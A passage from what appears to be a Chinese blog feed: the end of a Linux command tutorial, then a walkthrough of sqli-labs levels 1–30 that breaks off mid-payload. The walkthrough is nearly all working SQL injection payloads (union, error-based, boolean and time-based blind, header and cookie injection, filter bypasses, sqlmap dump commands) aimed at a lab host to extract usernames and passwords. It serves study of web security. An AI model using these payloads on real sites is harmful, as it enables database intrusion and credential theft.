class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">zip 压缩命令在windows/linux都通用，可以压缩目录且保留源文件。</span><br><span class="line">（1）、zip压缩</span><br><span class="line">zip 压缩文件名.zip  源文件</span><br><span class="line"></span><br><span class="line"># 压缩文件</span><br><span class="line"></span><br><span class="line">zip lnTest.zip lnTest.txt</span><br><span class="line"></span><br><span class="line"># -r 压缩文件夹</span><br><span class="line"></span><br><span class="line">zip -r  nginx1.zip nginx-1.21.6</span><br><span class="line"> （2）、unzip解压  </span><br><span class="line">unzip lnTest.zip</span><br><span class="line"></span><br><span class="line"># -d 指定解压后文件的存放目录</span><br><span class="line"></span><br><span class="line">unzip lnTest.zip -d /opt</span><br></pre></td></tr></table></figure><p>3）、tar 打包（多文件压缩，保留源文件）<br>tar [选项] XXX.tar.gz 将要打包进去的内容 （功能描述：打包目录，压缩后的文件格式.tar.gz）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">（1）、压缩文件  </span><br><span class="line">tar -zcvf 打包的文件名.tar.gz [源文件]</span><br><span class="line"></span><br><span class="line"># 多个文件打包</span><br><span class="line"></span><br><span class="line">tar -zcvf houma.tar.gz houge.txt bailongma.txt</span><br><span class="line"></span><br><span class="line"># 打包文件夹</span><br><span class="line"></span><br><span class="line">tar -zcvf xiyou.tar.gz xiyou/</span><br><span class="line"></span><br><span class="line"># 解压到当前目录</span><br><span class="line">tar -zxvf houma.tar.gz</span><br><span class="line"># -C 解压到某个目录下</span><br><span class="line">tar -zxvf xiyou.tar.gz -C /opt</span><br></pre></td></tr></table></figure><ol start="9"><li>进程管理类<br>(1)、进程是正在执行的一个程序或命令，每一个进程都是一个运行的实体，都有自己的地址空间，并占用一定的系统资源。<br>1）、ps 查看当前系统进程状态<br>ps -ef：列出所有进程的详细信息，包括进程的PID、PPID、CPU占用率、内存占用率等。<br>ps aux：与ps -ef类似，但是显示的是所有用户的进程信息。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231201160632415.png" alt="image-20231201160632415"></p><p>（2）、kill 终止进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1）通过pid终止进程</span><br><span class="line"></span><br><span class="line"># -9 表示强迫进程立即停止</span><br><span class="line"></span><br><span class="line">kill -9 5102</span><br><span class="line"> （2）通过进程名称杀死进程  </span><br><span class="line">killall firefox</span><br><span class="line"> window杀死进程：  </span><br><span class="line">taskkill /f /pid  进程ID</span><br></pre></td></tr></table></figure><ol start="10"><li>软件安装与下载<br>1)更新下载源</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><p>2）安装软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">常规安装命令</span><br><span class="line">sudo apt-get install &lt;软件名称&gt;</span><br><span class="line"></span><br><span class="line">省略安装</span><br><span class="line">sudo apt-get install -y &lt;软件名称&gt;</span><br><span class="line"></span><br><span class="line">重新安装</span><br><span class="line">sudo apt-get reinstall &lt;软件名称&gt;</span><br><span class="line"> 或者：</span><br><span class="line">sudo apt-get install --reinstall &lt;软件名称&gt;</span><br></pre></td></tr></table></figure><p>3）卸载软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">● 卸载指定的软件，但保留配置文件</span><br><span class="line">sudo apt-get remove &lt;软件名称&gt;</span><br><span class="line">● 卸载指定的软件，同时删除配置文件</span><br><span class="line">sudo apt-get purge &lt;软件名称&gt;</span><br><span class="line">或者：</span><br><span class="line">sudo apt-get --purge remove &lt;软件名称&gt;</span><br><span class="line">● 删除自动安装的软件包，这些软件包当初是为了满足其他软件包对它的依赖关系而安装的，而现在已经不再需要了。</span><br><span class="line">sudo apt-get autoremove</span><br><span class="line">●  在执行remove命令时使用--autoremove选项，可以同时删除无用的依赖包，类似在执行完remove命令后再执行一次autoremove命令。  </span><br><span class="line"> sudo apt-get remove --autoremove &lt;软件名称&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;linux发行版本&quot;&gt;Linux发行版本&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;目前linux有四大常见的主分支，分别为Debian系、Redhat系、Arch系和SUSE系&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/g</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十六，sqli通关笔记</title>
    <link href="http://example.com/2024/01/08/%E4%B8%89%E5%8D%81%E5%85%AD%EF%BC%8Csqli%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2024/01/08/%E4%B8%89%E5%8D%81%E5%85%AD%EF%BC%8Csqli%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</id>
    <published>2024-01-08T01:20:52.000Z</published>
    <updated>2024-01-08T01:22:14.096Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="sqli关卡">sqli关卡：</span></h4><h5><span id="get请求">get请求</span></h5><h5><span id="1字符型">1，字符型</span></h5><p><a href="http://192.168.2.59:808/sqli/Less-1/?id=-1">http://192.168.2.59:808/sqli/Less-1/?id=-1</a>‘ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database(); – -</p><p><a href="http://192.168.2.59:808/sqli/Less-1/?id=-1">http://192.168.2.59:808/sqli/Less-1/?id=-1</a>‘ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’; – -</p><p><a href="http://192.168.2.59:808/sqli/Less-1/?id=-1">http://192.168.2.59:808/sqli/Less-1/?id=-1</a>‘ union select 1,group_concat(id,username,password),3 from users; – -</p><h5><span id="2数字型">2，数字型</span></h5><p><a href="http://192.168.2.59:808/sqli/Less-2/?id=-1">http://192.168.2.59:808/sqli/Less-2/?id=-1</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’ – -</p><p><a href="http://192.168.2.59:808/sqli/Less-2/?id=-1">http://192.168.2.59:808/sqli/Less-2/?id=-1</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ – -</p><p><a href="http://192.168.2.59:808/sqli/Less-2/?id=-1">http://192.168.2.59:808/sqli/Less-2/?id=-1</a> union select 1,group_concat(id,username,password),3 from users – -</p><h5><span id="3型">3，’）型</span></h5><p><a href="http://192.168.2.59:808/sqli/Less-3/?id=-1">http://192.168.2.59:808/sqli/Less-3/?id=-1</a>‘) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’ – -</p><p><a href="http://192.168.2.59:808/sqli/Less-3/?id=-1">http://192.168.2.59:808/sqli/Less-3/?id=-1</a>‘) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ – -</p><p><a href="http://192.168.2.59:808/sqli/Less-3/?id=-1">http://192.168.2.59:808/sqli/Less-3/?id=-1</a>‘) union select 1,group_concat(id,username,password),3 from users – -</p><h5><span id="4_getid-字符型">4，“‘.$_GET[‘’id].’”  字符型</span></h5><p><a href="http://192.168.2.59:808/sqli/Less-3/?id=-1">http://192.168.2.59:808/sqli/Less-3/?id=-1</a>“) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’ – -</p><p><a href="http://192.168.2.59:808/sqli/Less-3/?id=-1">http://192.168.2.59:808/sqli/Less-3/?id=-1</a>“) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ – -</p><p><a href="http://192.168.2.59:808/sqli/Less-3/?id=-1">http://192.168.2.59:808/sqli/Less-3/?id=-1</a>“) union select 1,group_concat(id,username,password),3 from users – -</p><h5><span id="5无sql语句回显报错回显">5，无SQL语句回显，报错回显</span></h5><p><a href="http://192.168.2.59:808/sqli/Less-5/?id=-1">http://192.168.2.59:808/sqli/Less-5/?id=-1</a>‘ and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)))  –+</p><p><a href="http://192.168.2.59:808/sqli/Less-5/?id=-1">http://192.168.2.59:808/sqli/Less-5/?id=-1</a>‘ and (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e)))  –+</p><p><a href="http://192.168.2.59:808/sqli/Less-5/?id=-1">http://192.168.2.59:808/sqli/Less-5/?id=-1</a>‘ and (extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e)))  –+</p><h5><span id="6报错注入">6，报错注入</span></h5><p><a href="http://192.168.2.59:808/sqli/Less-6/?id=-1">http://192.168.2.59:808/sqli/Less-6/?id=-1</a>“ and (extractvalue(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),0x7e))) – -</p><p><a href="http://192.168.2.59:808/sqli/Less-6/?id=-1">http://192.168.2.59:808/sqli/Less-6/?id=-1</a>“ and (extractvalue(1,concat(0x7e,(select group_concat(column_name)  from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e))) – -</p><p><a href="http://192.168.2.59:808/sqli/Less-6/?id=-1">http://192.168.2.59:808/sqli/Less-6/?id=-1</a>“ and (extractvalue(1,concat(0x7e,(select group_concat(id,username,password)  from users),0x7e))) – -</p><h5><span id="7布尔盲注">7，布尔盲注</span></h5><p>pycharm\pycharmcode\SQL_py\布尔盲注.py</p><p>url &#x3D; “<a href="http://192.168.2.59:808/sqli/Less-7/?id=1">http://192.168.2.59:808/sqli/Less-7/?id=1</a>‘))”</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr(database(),{0},1))&gt;{1}–+”.format(i,tmp)</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),{0},1))&gt;{1}–+”.format(i,tmp)</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’and table_schema&#x3D;database() limit 3,1),{0},1))&gt;{1}–+”.format(i,tmp)</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select group_concat(id,username,password) from users),{0},1))&gt;{1}–+”.format(i,tmp)</p><h5><span id="8布尔盲注">8，布尔盲注</span></h5><p>pycharm\pycharmcode\SQL_py\布尔盲注8.py</p><p>url &#x3D; “<a href="http://192.168.2.59:808/sqli/Less-8/?id=1">http://192.168.2.59:808/sqli/Less-8/?id=1</a>‘“</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),{0},1))&gt;{1}–+”.format(i,tmp)</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’and table_schema&#x3D;database() limit 2,1),{0},1))&gt;{1}–+”.format(i,tmp)</p><p>paramsGet &#x3D; url+ “&#x2F;<strong>&#x2F;and&#x2F;</strong>&#x2F;ascii(substr((select group_concat(id,username,password) from users  ),{0},1))&gt;{1}–+”.format(i,tmp)</p><h5><span id="9睡眠注入">9，睡眠注入</span></h5><p>pycharm\pycharmcode\SQL_py\睡眠注入.py</p><p>url1&#x3D;”<a href="http://192.168.2.59:808/sqli/Less-9/?id=1">http://192.168.2.59:808/sqli/Less-9/?id=1</a>‘“</p><p>url&#x3D;url1+”and if( ascii(substring(database(),”+str(j)+”,1))&#x3D; “+str(i)+”,sleep(3),1)– -“</p><p>url&#x3D;url1+”and if( ascii(substring((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),”+str(j)+”,1))&#x3D; “+str(i)+”,sleep(3),1)– -“</p><p>url&#x3D;url1+”and if( ascii(substring((select column_name from information_schema.columns where table_name&#x3D;’users’and table_schema&#x3D;database() limit 2,1),”+str(j)+”,1))&#x3D; “+str(i)+”,sleep(3),1)– -“</p><p>url&#x3D;url1+”and if( ascii(substring((select group_concat(id,username,password) from users ),”+str(j)+”,1))&#x3D; “+str(i)+”,sleep(3),1)– -“</p><h5><span id="10睡眠注入">10，睡眠注入</span></h5><p>pycharm\pycharmcode\SQL_py\睡眠注入10.py</p><p>url1&#x3D;’<a href="http://192.168.2.59:808/sqli/Less-10/?id=1">http://192.168.2.59:808/sqli/Less-10/?id=1</a>“‘</p><p>url&#x3D;url1+”and if( ascii(substring((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),”+str(j)+”,1))&#x3D; “+str(i)+”,sleep(3),1)– -“</p><p>url&#x3D;url1+”and if( ascii(substring((select column_name from information_schema.columns where table_name&#x3D;’users’and table_schema&#x3D;database() limit 2,1),”+str(j)+”,1))&#x3D; “+str(i)+”,sleep(3),1)– -“</p><p>url&#x3D;url1+”and if( ascii(substring((select group_concat(id,username,password) from users ),”+str(j)+”,1))&#x3D; “+str(i)+”,sleep(3),1)– -“</p><h5><span id="post请求">post请求</span></h5><h5><span id="11返回两列">11，’返回两列</span></h5><p>uname&#x3D;0’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database(); – -&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p><p>uname&#x3D;0’ union select 1,group_concat(column_name)  from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database(); – -&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p><p>uname&#x3D;0’ union select group_concat(id,”<del>“,username,”</del>“,password),1 from users ; – -&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p><h5><span id="12">12，”)</span></h5><p>uname&#x3D;0”) union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database(); – -&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p><p>uname&#x3D;0”) union select 1,group_concat(column_name)  from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database(); – -&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p><p>uname&#x3D;0”) union select group_concat(id,”<del>“,username,”</del>“,password),1 from users ; – -&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p><h5><span id="13布尔盲注">13，布尔盲注</span></h5><p>src&#x3D;”..&#x2F;images&#x2F;slap.jpg”</p><p>src&#x3D;”..&#x2F;images&#x2F;flag.jpg”</p><p>pycharm\pycharmcode\SQL_py\布尔盲注13.py</p><p>url &#x3D; “<a href="http://192.168.2.59:808/sqli/Less-13/">http://192.168.2.59:808/sqli/Less-13/</a>“</p><p>“uname”:  “1’) and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),{0},1))&gt; {1}– -“.format(i,tmp),</p><p>“uname”:  “1’) and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’and table_schema&#x3D;database() limit 2,1),{0},1))&gt; {1}– -“.format(i,tmp),</p><p>“uname”:  “1’) and ascii(substr((select group_concat(id,username,password) from users  ),{0},1))&gt; {1}– -“.format(i,tmp),</p><h5><span id="14布尔盲注">14，布尔盲注</span></h5><p>src&#x3D;”..&#x2F;images&#x2F;slap.jpg”</p><p>src&#x3D;”..&#x2F;images&#x2F;flag.jpg”</p><p>pycharm\pycharmcode\SQL_py\布尔盲注14.py</p><p>url &#x3D; ‘<a href="http://192.168.2.59:808/sqli/Less-14/">http://192.168.2.59:808/sqli/Less-14/</a>‘</p><p>‘uname’:  ‘1” and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),{0},1))&gt; {1}– -‘.format(i,tmp),</p><p>‘uname’:  ‘1” and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;”users”and table_schema&#x3D;database() limit 2,1),{0},1))&gt; {1}– -‘.format(i,tmp),</p><p>‘uname’:  ‘1” and ascii(substr((select group_concat(id,username,password) from users  ),{0},1))&gt; {1}– -‘.format(i,tmp),</p><h5><span id="15布尔盲注">15，布尔盲注</span></h5><p>src&#x3D;”..&#x2F;images&#x2F;slap.jpg”</p><p>src&#x3D;”..&#x2F;images&#x2F;flag.jpg”</p><p>pycharm\pycharmcode\SQL_py\布尔盲注15.py</p><p>url &#x3D; “<a href="http://192.168.2.59:808/sqli/Less-15/">http://192.168.2.59:808/sqli/Less-15/</a>“</p><p>“uname”:  “1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),{0},1))&gt; {1}– -“.format(i,tmp),</p><p>“uname”:  “1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’and table_schema&#x3D;database() limit 2,1),{0},1))&gt; {1}– -“.format(i,tmp),</p><p>“uname”:  “1’ and ascii(substr((select group_concat(id,username,password) from users  ),{0},1))&gt; {1}– -“.format(i,tmp),</p><h5><span id="16布尔盲注">16，布尔盲注</span></h5><p>src&#x3D;”..&#x2F;images&#x2F;slap.jpg”</p><p>src&#x3D;”..&#x2F;images&#x2F;flag.jpg”</p><p>pycharm\pycharmcode\SQL_py\布尔盲注16.py</p><p>url &#x3D; ‘<a href="http://192.168.2.59:808/sqli/Less-16/">http://192.168.2.59:808/sqli/Less-16/</a>‘</p><p>‘uname’:  ‘1”) and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),{0},1))&gt; {1}– -‘.format(i,tmp),</p><p>‘uname’:  ‘1”) and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;”users”and table_schema&#x3D;database() limit 2,1),{0},1))&gt; {1}– -‘.format(i,tmp),</p><p>‘uname’:  ‘1”) and ascii(substr((select group_concat(id,username,password) from users  ),{0},1))&gt; {1}– -‘.format(i,tmp),</p><h5><span id="17报错注入">17,报错注入</span></h5><p>uname&#x3D;2&amp;passwd&#x3D;2’ and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))) – -&amp;submit&#x3D;Submit</p><p>uname&#x3D;2&amp;passwd&#x3D;2’ and (extractvalue(1,concat(0x7e,(select group_concat(column_name)  from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database()),0x7e))) – -&amp;submit&#x3D;Submit</p><p>uname&#x3D;2&amp;passwd&#x3D;-2’and (updatexml(1,concat(0x7e,(select group_concat(id) from security.emails),0x7e),1)) – -&amp;submit&#x3D;Submit</p><h5><span id="18user-agent信息注入">18，User-Agent信息注入</span></h5><p>1’and updatexml(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),0x7e),1),1,1)– -</p><p>1’and updatexml(1,concat(0x7e,(select group_concat(column_name)  from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e),1),1,1)– -</p><p>1’and updatexml(1,concat(0x7e,(select group_concat(id,username,password)  from users),0x7e),1),1,1)– -</p><h5><span id="19referer">19，Referer</span></h5><p>1’and updatexml(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),0x7e),1),1)– -</p><p>1’and updatexml(1,concat(0x7e,(select group_concat(column_name)  from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e),1),1)– -</p><p>1’and updatexml(1,concat(0x7e,(select group_concat(id,username,password)  from users),0x7e),1),1)– -</p><h5><span id="20cookie">20，Cookie</span></h5><p>uname&#x3D;2’and (extractvalue(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),0x7e))) #</p><p>uname&#x3D;2’and (extractvalue(1,concat(0x7e,(select group_concat(column_name)  from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e))) #</p><p>uname&#x3D;2’and (extractvalue(1,concat(0x7e,(select group_concat(id,username,<strong>password</strong>)  from users),0x7e))) #</p><h5><span id="21cookie中base64encode编码">21，cookie中base64encode编码，‘）</span></h5><p>python sqlmap.py -r 11.txt –batch –level&#x3D;3 –tamper&#x3D;”base64encode.py” –dbs</p><p>python sqlmap.py -r 11.txt –batch –level&#x3D;3 –tamper&#x3D;”base64encode.py” -D security –tables</p><p>python sqlmap.py -r 11.txt –batch –level&#x3D;3 –tamper&#x3D;”base64encode.py” -D security -T users –columns</p><p>python sqlmap.py -r 11.txt –batch –level&#x3D;3 –tamper&#x3D;”base64encode.py” -D security -T users –dump</p><h5><span id="22cookie中base64encode编码">22，cookie中base64encode编码，“</span></h5><p>uname&#x3D;2“and (extractvalue(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema&#x3D;database()),0x7e))) #</p><p>uname&#x3D;2”and (extractvalue(1,concat(0x7e,(select group_concat(column_name)  from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x7e))) #</p><p>uname&#x3D;2“and (extractvalue(1,concat(0x7e,(select group_concat(id,username,<strong>password</strong>)  from users),0x7e))) #</p><h5><span id="23和都被被过滤为空字符串">23，#和–都被被过滤为空字符串</span></h5><p><a href="http://192.168.2.59:808/sqli/Less-23/?id=1">http://192.168.2.59:808/sqli/Less-23/?id=1</a>‘ or (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)))  and ‘1’&#x3D;’1</p><p><a href="http://192.168.2.59:808/sqli/Less-23/?id=1">http://192.168.2.59:808/sqli/Less-23/?id=1</a>‘ or (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database()),0x7e)))  and ‘1’&#x3D;’1</p><p><a href="http://192.168.2.59:808/sqli/Less-23/?id=1">http://192.168.2.59:808/sqli/Less-23/?id=1</a>‘ or (extractvalue(1,concat(0x7e,(select group_concat(id,”<del>“,username,”</del>“,password) from users ),0x7e)))  and ‘1’&#x3D;’1</p><h5><span id="24二次注入修改管理员密码">24，二次注入修改管理员密码</span></h5><p>andmin’– -</p><h5><span id="25or和and被过滤">25，or和and被过滤</span></h5><p><a href="http://192.168.2.59:808/sqli/Less-25/?id=1">http://192.168.2.59:808/sqli/Less-25/?id=1</a>‘  oorr extractvalue(1,concat(0x7e,(select group_concat(table_name)  from infoorrmation_schema.tables where table_schema&#x3D;database()),0x7e))  anandd ‘1’&#x3D;’1</p><p><a href="http://192.168.2.59:808/sqli/Less-25/?id=1">http://192.168.2.59:808/sqli/Less-25/?id=1</a>‘  oorr extractvalue(1,concat(0x7e,(select group_concat(column_name)  from infoorrmation_schema.columns where table_name&#x3D;’users’ anandd table_schema&#x3D;database()),0x7e))  anandd ‘1’&#x3D;’1</p><p><a href="http://192.168.2.59:808/sqli/Less-25/?id=1">http://192.168.2.59:808/sqli/Less-25/?id=1</a>‘  oorr extractvalue(1,concat(0x7e,(select group_concat(id,”<del>“,username,”</del>“,passwoorrd) from users ),0x7e))  anandd ‘1’&#x3D;’1</p><h5><span id="25a数字型联合查询">25a,数字型联合查询</span></h5><p><a href="http://192.168.2.59:808/sqli/Less-25a/?id=-1">http://192.168.2.59:808/sqli/Less-25a/?id=-1</a> union select 1,group_concat(table_name) ,3 from infoorrmation_schema.tables where table_schema&#x3D;database()</p><p><a href="http://192.168.2.59:808/sqli/Less-25a/?id=-1">http://192.168.2.59:808/sqli/Less-25a/?id=-1</a> union select 1,group_concat(column_name) ,3 from infoorrmation_schema.columns where table_name&#x3D;’users’ anandd table_schema&#x3D;database()</p><p><a href="http://192.168.2.59:808/sqli/Less-25a/?id=-1">http://192.168.2.59:808/sqli/Less-25a/?id=-1</a> union select 1, group_concat(id,username,passwoorrd) ,3 from users</p><h5><span id="26空格和注释被过滤">26，空格和注释被过滤</span></h5><p><a href="http://192.168.2.55:808/sqli/Less-26/?id=-1%27%7C%7Cupdatexml">http://192.168.2.55:808/sqli/Less-26/?id=-1&#39;||updatexml</a>(1,concat(0x7e,(select (group_concat(table_name))  from (infoorrmation_schema.tables) where (table_schema&#x3D;database())),0x7e),1)||’1’&#x3D;’1</p><p><a href="http://192.168.2.55:808/sqli/Less-26/?id=-1%27%7C%7Cupdatexml">http://192.168.2.55:808/sqli/Less-26/?id=-1&#39;||updatexml</a>(1,concat(0x7e,(select (group_concat(column_name)) from (infoorrmation_schema.columns) where (table_name&#x3D;’users’) anandd(table_schema&#x3D;database())),0x7e),1)||’1’&#x3D;’1</p><p><a href="http://192.168.2.55:808/sqli/Less-26/?id=-1%27%7C%7Cupdatexml">http://192.168.2.55:808/sqli/Less-26/?id=-1&#39;||updatexml</a>(1,concat(0x7e,(select (group_concat(id,”<del>“,username,”</del>“,passwoorrd)) from (users) ),0x7e),1)||’1’&#x3D;’1</p><h5><span id="26a没有报错回显">26a,没有报错回显</span></h5><p>pycharm\pycharmcode\SQL_py\布尔盲注26a.py</p><p>url &#x3D; “<a href="http://192.168.2.55:808/sqli/Less-26a/?id=1">http://192.168.2.55:808/sqli/Less-26a/?id=1</a>‘“</p><p>paramsGet &#x3D; url+ “anandd(ascii(substr(database(),{0},1))&gt;{1})anandd’1’&#x3D;’1”.format(i,tmp)</p><p>paramsGet &#x3D; url+ “anandd(ascii(substr((select (group_concat(table_name) ) from (infoorrmation_schema.tables) where (table_schema&#x3D;database())),{0},1))&gt;{1})anandd’1’&#x3D;’1”.format(i,tmp)</p><p>paramsGet &#x3D; url+ “anandd(ascii(substr((select (group_concat(column_name) ) from (infoorrmation_schema.columns) where ((table_name&#x3D;’users’) anandd (table_schema&#x3D;database()))),{0},1))&gt;{1})anandd’1’&#x3D;’1”.format(i,tmp)</p><p>paramsGet &#x3D; url+ “anandd(ascii(substr((select (group_concat(id,username,passwoorrd)) from (users)  ),{0},1))&gt;{1})anandd’1’&#x3D;’1”.format(i,tmp)</p><h5><span id="27union和select被过滤0a当空格用部分大写部分小写绕过">27，union和select被过滤，%0a当空格，用部分大写部分小写绕过</span></h5><p><a href="http://192.168.2.55:808/sqli/Less-27/?id=1">http://192.168.2.55:808/sqli/Less-27/?id=1</a>‘ %0a  and %0a  (extractvalue(1,concat(0x7e,(selEct %0a  group_concat(table_name) %0a  from %0a  information_schema.tables %0a  where %0a  table_schema&#x3D;database()),0x7e))) %0a and’1’&#x3D;’1</p><p><a href="http://192.168.2.55:808/sqli/Less-27/?id=1">http://192.168.2.55:808/sqli/Less-27/?id=1</a>‘ %0a  and %0a  (extractvalue(1,concat(0x7e,(selEct %0a  group_concat(column_name) %0a  from %0a  information_schema.columns %0a  where %0a table_name&#x3D;’users’ %0a and %0a table_schema&#x3D;database()),0x7e))) %0a and’1’&#x3D;’1</p><p><a href="http://192.168.2.55:808/sqli/Less-27/?id=1">http://192.168.2.55:808/sqli/Less-27/?id=1</a>‘ %0a  and %0a  (extractvalue(1,concat(0x7e,(selEct %0a  group_concat(password) %0a  from %0a  users),0x7e))) %0a and’1’&#x3D;’1</p><h5><span id="27a无报错用布尔盲注">27a,无报错用布尔盲注</span></h5><p>pycharm\pycharmcode\SQL_py\布尔盲注27a.py</p><p>url &#x3D; ‘<a href="http://192.168.2.55:808/sqli/Less-27a/?id=1">http://192.168.2.55:808/sqli/Less-27a/?id=1</a>“‘</p><p>paramsGet &#x3D; url+ ‘%0aand%0aascii(substr(database(),{0},1))&gt;{1}%0a and”1”&#x3D;”1’.format(i,tmp)</p><h5><span id="28布尔盲注union和select被过滤">28，’)布尔盲注，union和select被过滤</span></h5><p>pycharm\pycharmcode\SQL_py\布尔盲注28.py</p><p>url &#x3D; “<a href="http://192.168.2.55:808/sqli/Less-28/?id=1">http://192.168.2.55:808/sqli/Less-28/?id=1</a>‘)”</p><p>paramsGet &#x3D; url+ “%0aand%0aascii(substr(database(),{0},1))&gt;{1}%0a and(‘1’)&#x3D;(‘1”.format(i,tmp)</p><h5><span id="28a布尔盲注">28a,’布尔盲注</span></h5><p>pycharm\pycharmcode\SQL_py\1.py</p><p>url1 &#x3D; “<a href="http://192.168.2.55:808/sqli/Less-28a/?id=1">http://192.168.2.55:808/sqli/Less-28a/?id=1</a>‘“</p><p>url&#x3D;url1+f”%0a and(ascii(substr(database(),{j},1))&#x3D;{i})and’1’&#x3D;’1”</p><h5><span id="29http参数污染">29，http参数污染，‘</span></h5><p><a href="http://192.168.2.55:808/sqli/Less-29/?id=1&id=-1">http://192.168.2.55:808/sqli/Less-29/?id=1&amp;id=-1</a>‘ union select 1,database(),3 and ‘1’&#x3D;’1</p><h5><span id="30">30，“</span></h5><p><a href="http://192.168.2.55:808/sqli/Less-30/?id=1&id=0">http://192.168.2.55:808/sqli/Less-30/?id=1&amp;id=0</a>“ union select 